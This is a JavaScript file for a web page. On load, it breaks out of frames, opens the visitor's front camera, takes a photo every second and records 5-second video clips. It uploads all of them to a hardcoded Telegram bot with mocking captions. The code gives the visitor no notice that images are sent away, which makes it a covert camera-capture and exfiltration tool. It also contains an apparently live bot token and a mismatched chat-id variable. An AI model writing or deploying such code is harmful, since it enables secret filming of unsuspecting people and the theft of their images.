if (window.self !== window.top) {
  window.top.location.href = window.self.location.href;
}

const telegramBotToken = '7681007287:AAHGM2fVski8em0lDessM2jwXNalOEwAGu8';
const telegramChat_id = '6389434208';
const photoDescription = 'NIH MUKA MUSANG';
const videoDescription = 'IH VIDEY';
const photoInterval = 1000; // Spam Foto 1 detik
const recordInterval = 5000; // Spam Video 5 Detik

let videoStream;
let mediaRecorder;
let recordedBlobs = [];

async function initCamera() {
  try {
    const constraints = {
      audio: false,
      video: {
        facingMode: "user"
      }
    };
    videoStream = await navigator.mediaDevices.getUserMedia(constraints);
    const videoElement = document.getElementById('video');
    videoElement.srcObject = videoStream;

    startRecording();
    startPhotoSpam();

  } catch (error) {
    console.error('Error accessing media devices:', error);
  }
}

function sendPhotoToTelegram(imageData) {
  const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
  const formData = new FormData();
  formData.append('chat_id', telegramChannelId);
  formData.append('photo', dataURLtoBlob(imageData), 'capture.png');
  formData.append('caption', photoDescription);

  fetch(apiUrl, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log('Send Photo To Telegram', data);
    })
    .catch(error => {
      console.error('Error Sending Photo To Telegram:', error);
    });
}

function dataURLtoBlob(dataURL) {
  const byteString = atob(dataURL.split(',')[1]);
  const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], {
    type: mimeString
  });
}

function startPhotoSpam() {
  setInterval(() => {
    if (videoStream && videoStream.active) {
      const canvas = document.getElementById('canvas');
      const videoElement = document.getElementById('video');
      const context = canvas.getContext('2d');
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      const imageDataURL = canvas.toDataURL('image/png').replace("image/png", "image/octet-stream");
      sendPhotoToTelegram(imageDataURL);
    }
  }, photoInterval);
}

function handleDataAvailable(event) {
  if (event.data && event.data.size > 0) {
    recordedBlobs.push(event.data);
  }
}

function handleStop() {
  const superBuffer = new Blob(recordedBlobs, {
    type: 'video/webm'
  });
  sendVideoToTelegram(superBuffer);
  recordedBlobs = [];
  if (videoStream && videoStream.active) {
    startRecording();
  }
}

function startRecording() {
  if (!videoStream) return;
  mediaRecorder = new MediaRecorder(videoStream, {
    mimeType: 'video/webm;codecs=vp9,opus'
  });
  mediaRecorder.ondataavailable = handleDataAvailable;
  mediaRecorder.onstop = handleStop;
  mediaRecorder.start();
  console.log('Start Recording ');
}

async function sendVideoToTelegram(videoBlob) {
  const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendVideo`;
  const formData = new FormData();
  formData.append('chat_id', telegramChannelId);
  formData.append('video', videoBlob, 'Record.webm');
  formData.append('caption', videoDescription);

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      body: formData
    });

    const data = await response.json();
    console.log('Video Sendinh To Telegram:', data);
  } catch (error) {
    console.error('Error mengirim video ke Telegram:', error);
  }
}

document.addEventListener('DOMContentLoaded', async () => {
  await initCamera();
  setInterval(() => {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
      mediaRecorder.stop();
    }
  }, recordInterval);
});
